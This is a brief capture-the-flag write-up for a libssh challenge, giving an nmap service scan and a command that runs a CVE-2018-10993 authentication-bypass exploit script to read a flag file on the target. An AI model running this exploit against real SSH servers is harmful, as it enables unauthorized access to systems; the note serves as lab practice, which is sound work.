# CyberSecurity



libssh

Flag format: CTF{sha256}
libssh is a C library that enables you to write a program that uses the SSH protocol. With it, you can remotely execute programs, transfer files, or use a secure and transparent tunnel for your remote programs.
using Nmap to scan the port 
nmap –sV –sC –p port ip -Pn
after scanning we can use CVE-2018-10993 libSSH authentication bypass exploit
cve-2018-10993.py ip -p port -31367 -c "cd ..;cat flag.txt"
ctf



